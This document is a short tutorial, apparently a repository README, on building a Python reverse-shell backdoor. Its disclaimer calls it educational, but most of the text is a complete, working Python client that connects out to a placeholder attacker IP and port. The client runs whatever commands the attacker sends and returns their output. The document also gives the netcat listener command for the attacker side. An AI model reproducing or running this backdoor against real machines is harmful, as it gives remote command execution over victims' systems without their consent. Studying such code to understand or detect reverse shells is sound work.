# Python - Backdoor implementation with socket

## Information
### DISCLAIMER
```
DISCLAIMER:
This is a Cybersecurity Technique known as a Reverse Shell attack using a Backdoor Trojan.

This is meant to be for educational purposes only and to understand the usage of socket programming within Cybersecurity

Please do not attack anyone unethically (of course) and without permission.
```

## Setup
### Pre-Requisites
- Network Connection

### Dependencies
+ netcat (nc)
+ python

## Usage
- Launch netcat on the listener/server machine (Attacker)
    ```console
    nc -l -v -p {your-listening-port-number}
    ```
    
- Launch this in your client machine (victim/target)
    ```python
    #!/bin/python3
    import os
    import sys
    import subprocess
    import socket

    def backdoor():
        """
        backdoor trojan using socket
        """
        kali_ip = "[your-attacker-IP]" # Your attacker IP
        listening_port = [attacker-listening-port-number]
        sock = (kali_ip, listening_port)
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(sock) # Connect to the specified socket
        received_data = ""

        while True:
            received_data = client.recv(1024).decode("utf-8").strip() # Receive reply from the connection
            print("Received Data : {}".format(received_data))

            if received_data == "quit":
                break
            elif received_data != "":
                # Execute command
                cmd_to_run = received_data.split(" ")
                if cmd_to_run[0] == "cd":
                    # Change Directory
                    target_dirpath = cmd_to_run[1]
                    os.chdir(target_dirpath)
                    process = subprocess.Popen(["pwd"], stdout=subprocess.PIPE)
                else:
                    print("Command to Run : {}".format(cmd_to_run))
                    process = subprocess.Popen(cmd_to_run, stdout=subprocess.PIPE) # stdin must be PIPE to use communicate
                res = process.communicate()[0]
                print("Result : {}".format(res))

                # Send back the data
                client.send(res)

        client.close() # Close the socket connection

    def main():
        backdoor()

    if __name__ == "__main__":
        main()
    ``` 
